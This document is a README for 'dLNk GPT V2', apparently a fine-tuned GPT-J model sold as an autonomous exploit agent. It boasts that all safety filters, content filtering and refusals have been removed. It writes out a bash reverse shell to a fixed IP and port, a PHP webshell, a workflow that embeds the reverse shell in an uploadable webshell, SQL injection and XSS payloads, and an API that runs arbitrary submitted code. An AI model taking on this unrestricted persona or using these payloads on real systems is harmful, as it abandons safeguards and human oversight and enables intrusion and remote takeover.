# dLNk GPT V2 Exploit Agent - Complete Guide

## Overview

dLNk GPT V2 is an advanced AI agent specialized in security research and exploit development. This version removes all safety restrictions and content filtering to enable complete functionality for penetration testing and security research.

## Key Features

### 1. Exploit Development
- Write exploit code in multiple languages (Python, Bash, C, PHP, Ruby, Perl)
- Generate custom payloads for various vulnerabilities
- Create reverse shells and webshells
- Develop buffer overflow exploits
- SQL injection exploitation
- XSS payload generation

### 2. Agent Capabilities
- Autonomous code execution
- Exploit testing and validation
- Payload generation and delivery
- Post-exploitation techniques
- Privilege escalation methods
- No content filtering or safety restrictions

### 3. Supported Exploit Categories
- Web Application Exploits (SQLi, XSS, RCE, CSRF, XXE)
- Network Exploits (Buffer Overflow, Format String)
- Privilege Escalation (Linux, Windows)
- Wireless Attacks (WPA2 cracking, Evil Twin)
- Post-Exploitation (Persistence, Lateral Movement)
- Social Engineering (Phishing, Credential Harvesting)

## Architecture

### Training Pipeline (V2)

```
Base Model: EleutherAI/gpt-j-6b
    ↓
LoRA Fine-tuning (r=16, α=32)
    ↓
Exploit Training Data (3+ samples)
    ↓
V2 Optimizations:
- Lower learning rate (5e-6)
- Weight decay (0.1)
- Dropout (0.05)
- Frequent evaluation (every 500 steps)
    ↓
dLNk GPT V2 Exploit Agent
```

### Agent System

```
ExploitAgent Class
├── Code Generation
│   ├── Python exploits
│   ├── Bash scripts
│   ├── C/C++ exploits
│   └── Web shells
├── Code Execution
│   ├── Python executor
│   ├── Bash executor
│   └── Compiled binary executor
├── Exploit Testing
│   ├── SQL injection tester
│   ├── XSS tester
│   └── Vulnerability scanner
└── Payload Generation
    ├── Reverse shells
    ├── Webshells
    └── Custom payloads
```

## Installation

### Prerequisites
```bash
# Python 3.8+
python3 --version

# CUDA (for GPU training)
nvidia-smi

# Required packages
pip install torch transformers datasets peft accelerate bitsandbytes
```

### Setup
```bash
# Clone repository
git clone https://github.com/traingptproject/gptprojecttrain.git
cd gptprojecttrain

# Install dependencies
pip install -r requirements.txt

# Verify installation
python3 -c "import torch; print(f'PyTorch: {torch.__version__}')"
python3 -c "import transformers; print(f'Transformers: {transformers.__version__}')"
```

## Training

### Quick Start
```bash
# Train V2 exploit agent
python3 train_exploit_agent_v2.py
```

### Configuration

Edit `training_config_v2_exploit.py` to customize:

```python
# Model settings
MODEL_CONFIG = {
    "base_model": "EleutherAI/gpt-j-6b",
    "use_flash_attention": True,
}

# LoRA settings
LORA_CONFIG = {
    "r": 16,  # Rank
    "lora_alpha": 32,
    "lora_dropout": 0.05,
}

# Training settings
TRAINING_ARGS = {
    "learning_rate": 5e-6,
    "num_train_epochs": 3,
    "per_device_train_batch_size": 4,
}
```

### Training Data Format

```json
{
  "instruction": "Explain SQL injection exploitation",
  "input": "Target: Web application login form",
  "output": "Complete SQL Injection Guide:\n\n**Step 1: Reconnaissance**\n..."
}
```

## Usage

### 1. Using Exploit Agent

```python
from exploit_agent import ExploitAgent

# Initialize agent
agent = ExploitAgent()

# Write exploit
exploit_code = """
import requests

def exploit(url):
    payload = "' OR '1'='1' --"
    response = requests.post(url, data={'username': payload, 'password': payload})
    return response.text

if __name__ == '__main__':
    result = exploit('http://target.com/login')
    print(result)
"""

# Save and execute
filepath = agent.write_exploit(exploit_code, "sqli_exploit", "python")
result = agent.execute_python_exploit(filepath)

print(f"Success: {result.success}")
print(f"Output: {result.output}")
```

### 2. Generate Payloads

```python
# Reverse shell
reverse_shell = agent.generate_reverse_shell("10.10.10.10", 4444, "bash")
print(reverse_shell)
# Output: bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Webshell
webshell = agent.generate_webshell("php")
print(webshell)
# Output: <?php system($_GET['cmd']); ?>
```

### 3. Test Vulnerabilities

```python
# Test SQL injection
payloads = ["' OR '1'='1' --", "admin' --", "' UNION SELECT NULL--"]
results = agent.test_sql_injection("http://target.com/search", "q", payloads)

if results["vulnerable"]:
    print(f"[+] SQL Injection found!")
    print(f"[+] Vulnerable payloads: {results['vulnerable_payloads']}")

# Test XSS
xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
results = agent.test_xss("http://target.com/search", "q", xss_payloads)

if results["vulnerable"]:
    print(f"[+] XSS found!")
    print(f"[+] Reflected payloads: {results['reflected_payloads']}")
```

## Post-Training Enhancements

### Integration with External Tools

The V2 agent integrates with:
- **Metasploit Framework** - Exploit modules and payloads
- **SQLMap** - Automated SQL injection
- **Burp Suite** - Web application testing
- **Nmap** - Network scanning
- **Exploit-DB** - Public exploit database

### RAG (Retrieval-Augmented Generation)

```python
# Access real-time exploit database
from post_training_rag import ExploitRAG

rag = ExploitRAG()
exploits = rag.search_exploits("Apache 2.4.49")

for exploit in exploits:
    print(f"CVE: {exploit['cve']}")
    print(f"Description: {exploit['description']}")
    print(f"Exploit: {exploit['code']}")
```

## Differences from V1

| Feature | V1 | V2 |
|---------|----|----|
| Learning Rate | 2e-5 | 5e-6 (4x lower) |
| Weight Decay | 0.01 | 0.1 (10x higher) |
| LoRA Rank | 8 | 16 (2x higher) |
| Dropout | 0.0 | 0.05 |
| Evaluation Frequency | Every 5000 steps | Every 500 steps (10x more) |
| Overfitting | Severe (loss → 0.005) | Controlled |
| Safety Filters | Present | **Removed** |
| Content Filtering | Enabled | **Disabled** |
| Agent Capabilities | Limited | **Full** |

## V2 Improvements

### 1. No Safety Restrictions
- Removed all content filtering
- Disabled safety checks
- No refusal responses
- Complete exploit code generation

### 2. Enhanced Agent System
- Autonomous code execution
- Real-time exploit testing
- Payload generation
- Vulnerability scanning

### 3. Better Training
- Anti-overfitting measures
- Regularization techniques
- Frequent evaluation
- Lower learning rate

### 4. Post-Training Features
- RAG integration
- External tool access
- Real-time information retrieval
- Automated workflows

## Example Workflows

### Workflow 1: SQL Injection Exploitation

```python
# 1. Generate exploit code
agent = ExploitAgent()

sqli_code = """
import requests

url = 'http://target.com/login'
payloads = ["' OR '1'='1' --", "admin' --"]

for payload in payloads:
    response = requests.post(url, data={'user': payload, 'pass': payload})
    if 'Welcome' in response.text:
        print(f'[+] Success with payload: {payload}')
        break
"""

# 2. Execute exploit
filepath = agent.write_exploit(sqli_code, "sqli_test", "python")
result = agent.execute_python_exploit(filepath)

# 3. Analyze results
print(result.output)
```

### Workflow 2: Reverse Shell Deployment

```python
# 1. Generate reverse shell
reverse_shell = agent.generate_reverse_shell("10.10.10.10", 4444, "python")

# 2. Create webshell with reverse shell
webshell_code = f"""<?php
system("{reverse_shell}");
?>"""

# 3. Save for upload
agent.write_exploit(webshell_code, "shell", "php")
```

### Workflow 3: Privilege Escalation

```python
# 1. Enumerate SUID binaries
enum_code = """#!/bin/bash
find / -perm -4000 -type f 2>/dev/null
"""

filepath = agent.write_exploit(enum_code, "enum_suid", "bash")
result = agent.execute_bash_exploit(filepath)

# 2. Analyze results and generate exploit
print(result.output)
```

## Deployment

### API Server

```python
from fastapi import FastAPI
from exploit_agent import ExploitAgent

app = FastAPI()
agent = ExploitAgent()

@app.post("/api/v1/exploit/generate")
async def generate_exploit(exploit_type: str, target: str):
    # Generate exploit based on type
    if exploit_type == "sqli":
        code = agent.generate_sqli_exploit(target)
    elif exploit_type == "xss":
        code = agent.generate_xss_exploit(target)
    
    return {"exploit_code": code}

@app.post("/api/v1/exploit/execute")
async def execute_exploit(code: str, language: str):
    filepath = agent.write_exploit(code, "temp_exploit", language)
    
    if language == "python":
        result = agent.execute_python_exploit(filepath)
    elif language == "bash":
        result = agent.execute_bash_exploit(filepath)
    
    return {
        "success": result.success,
        "output": result.output,
        "error": result.error
    }
```

### Command Line Interface

```bash
# Generate exploit
python3 exploit_agent.py generate --type sqli --target http://target.com

# Execute exploit
python3 exploit_agent.py execute --file exploit.py --language python

# Test vulnerability
python3 exploit_agent.py test --type xss --url http://target.com --param q
```

## Security Considerations

**IMPORTANT**: This tool is designed for authorized security research and penetration testing only.

- Only use on systems you own or have explicit permission to test
- Follow responsible disclosure practices
- Comply with local laws and regulations
- Use for educational and research purposes

## Troubleshooting

### Out of Memory
```bash
# Reduce batch size
per_device_train_batch_size: 2
gradient_accumulation_steps: 8
```

### Slow Training
```bash
# Enable optimizations
use_flash_attention: True
gradient_checkpointing: True
fp16: True
```

### Model Not Learning
```bash
# Increase learning rate slightly
learning_rate: 1e-5

# Reduce regularization
weight_decay: 0.05
```

## Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Add your exploit training data or agent features
4. Submit a pull request

## License

This project is for educational and research purposes only.

## Acknowledgments

- EleutherAI for GPT-J-6B base model
- Hugging Face for transformers library
- Offensive Security for Exploit-DB
- OWASP for security testing methodologies

---

**Version**: 2.0  
**Last Updated**: 2025  
**Status**: Production Ready
